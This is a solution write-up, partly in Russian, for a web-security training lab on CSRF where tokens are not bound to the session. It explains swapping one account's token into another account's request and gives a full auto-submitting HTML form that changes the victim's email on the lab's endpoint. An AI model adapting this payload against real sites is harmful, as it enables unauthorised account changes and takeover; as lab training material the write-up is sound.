# CSRF where token is not tied to user session
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

* wiener:peter
* carlos:montoya

## Решение
Залогинился в режиме инкогнито под одним пользователем, открыл инструменты разработчика, через Inspect скопировал CSRF-токен, залогинился в обычном режиме под другим пользователем, заменил через Inspect CSRF-токен, отправил форму - работает.

Подготовил эксплойт с валидным токеном своего пользователя:
```
<html>
<body>
    <form action="https://0a5d00fa03efc48b83062e1e00cd0056.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="wiener123@normal-user.net" />
        <input required="" type="hidden" name="csrf" value="39JVOoyvNG0kPdWep7qiN5cFHOeIAzOc" />
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```
Deliver exploit to victim -> задание выполнено.
